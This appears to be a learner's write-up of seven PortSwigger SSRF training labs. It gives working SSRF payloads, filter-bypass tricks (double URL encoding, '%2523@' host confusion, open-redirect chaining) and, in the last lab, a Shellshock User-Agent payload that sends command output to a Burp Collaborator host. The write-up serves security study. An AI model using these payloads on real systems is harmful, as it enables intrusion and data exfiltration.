### 1. Lab: Basic SSRF against the local server
> This lab has a stock check feature which fetches data from an internal system.
To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

It is using external API in order to check the stock. So we will change the URL to `http://localhost/admin` to see, what it renders. In the source code, we will see it is requesting `/admin/delete?username=carlos` in order to delete carlos user. So we will send that URL in stockAPI to solve the lab.
![[Pasted image 20250730185309.png]]
> Solution: `stockApi=http://localhost/admin/delete?username=carlos`

### 2. Lab: Basic SSRF against another back-end system
> This lab has a stock check feature which fetches data from an internal system.
To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`.

In this application, we have to enumerate IP address from 1-255 using intruder and at `.3` we will get status code of `200`.
![[Pasted image 20250730190132.png]]
Requesting that IP will give us the results we want!
![[Pasted image 20250730190156.png]]
Sending the request to delete carlos user will solve the lab.
> Solution: Enumerate through octat

### 3. Lab: SSRF with blacklist-based input filter
> This lab has a stock check feature which fetches data from an internal system.
To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.
The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

Instead of localhost, we can use `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`. In this case, I tried to use `http://127.1/admin` but it didn't work. So I tried to encode `a` in admin, still didn't work. Double encoding `a` worked and gave the results.
![[Pasted image 20250730191650.png]]
Deleting the carlos user will solve the lab.
> Solution: Use alternative of localhost and url encode characters.

### 4. Lab:  SSRF with whitelist-based input filter
> This lab has a stock check feature which fetches data from an internal system.
To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.
The developer has deployed an anti-SSRF defense you will need to bypass.

When we try to use localhost url, it gave us this error `External stock check host must be stock.weliketoshop.net`. So we can say there is a whitelist based input filter.
![[Pasted image 20250731095903.png]]
If we enter the valid URL, then it says Internal Server Error.
![[Pasted image 20250731100850.png]]
Now, what if we add username and password as localhost and port 80 into the domain, will that work?
![[Pasted image 20250731100942.png]]
Didn't gave any error, so might worked. Next, we will use `#` to fragment URL.
![[Pasted image 20250731101037.png]]
It gave us error, next we will try to encode and double encode each of the characters to see if anything works.
![[Pasted image 20250731101120.png]]
Double encoding `#` worked and we can now see the admin page! Now simply sending the get request to delete carlos user will solve the lab.
#### Alternative Method
We can generate payload from https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet and use intruder to enumerate though each of the payload and sort by status code will also give us the desired results.
![[Pasted image 20250731104845.png]]
Results
![[Pasted image 20250731104944.png]]
> Solution: `http://localhost:80%2523@stock.weliketoshop.net/admin`

### 5. Lab: SSRF with filter bypass via open redirection vulnerability
> This lab has a stock check feature which fetches data from an internal system.
To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.
The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

In this application, there are 2 particular request - leveraging that will solve the lab.
First one is where it is fetching StockAPI.
![[Pasted image 20250731101917.png]]
Second one is Next product button, where it is redirected to next product.
![[Pasted image 20250731101943.png]]
Now using the next product URL into the stockAPI will give us the admin page.
![[Pasted image 20250731102013.png]]Deleting carlos user will solve the lab.
> Solution: `/product/nextProduct?currentProductId=6&path=http://192.168.0.12:8080/admin`

### 6. Lab: Blind SSRF with out-of-band detection
> This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

As it is making a request from the URL provided using Referer header, we simply have to enter the collaborator payload in order to solve this lab.
![[Pasted image 20250731102831.png]]
> Solution: Check headers too!

### 7. Lab: Blind SSRF with Shellshock exploitation
> This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the `192.168.0.X` range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

In this application, we will use Shellshock payload in user agent and we will enumerate `192.168.0.X:8080` from referer header.
User Agent: `() { :; }; /usr/bin/nslookup $(whoami).burp_collaborator_domain`
![[Pasted image 20250731104141.png]]
Checking into burp collaborator will give us the whoami output.
![[Pasted image 20250731104238.png]]
> Solution: `peter-avbQFg`

